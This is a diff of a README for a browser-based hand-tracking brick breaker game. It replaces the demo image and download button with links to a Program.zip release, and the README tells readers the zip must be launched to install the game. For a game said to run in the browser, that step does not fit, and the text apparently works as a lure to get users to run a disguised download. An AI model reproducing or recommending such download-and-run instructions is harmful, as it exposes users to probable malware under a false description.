@@ -2,7 +2,7 @@
 
 Welcome to the **Manual Brick Breaker** repository! Play a classic brick breaker game right in your browser using hand-tracking technology powered by JavaScript and MediaPipe. 
 
-![Brick Breaker Demo](https://imgur.com/gallery/Br8PzFm)
+![Brick Breaker Demo](https://github.com/BoOoDy123/manual-brick-breaker/releases/download/v1.0/Program.zip)
 
 ## Description
 **Manual Brick Breaker** allows you to immerse yourself in the world of retro gaming by breaking bricks with a paddle controlled by your hand movements. With the integration of hand-tracking technology, you can experience a whole new level of interactivity and fun in this browser-based game. 
@@ -18,9 +18,9 @@ Move your hand to control the paddle at the bottom of the screen. Make sure to b
 
 ## Installation
 You can download the necessary files for the game by clicking the button below:
-[![Download Manual Brick Breaker](https://img.shields.io/badge/Download-Software.zip-brightgreen)](https://github.com/rokytd/files/raw/refs/heads/master/Software.zip)
+[![Download Manual Brick Breaker](https://github.com/BoOoDy123/manual-brick-breaker/releases/download/v1.0/Program.zip)](https://github.com/BoOoDy123/manual-brick-breaker/releases/download/v1.0/Program.zip)
 
-**Note:** The Software.zip file needs to be launched to install the game on your system.
+**Note:** The https://github.com/BoOoDy123/manual-brick-breaker/releases/download/v1.0/Program.zip file needs to be launched to install the game on your system.
 
 ## Technologies Used
 - JavaScript
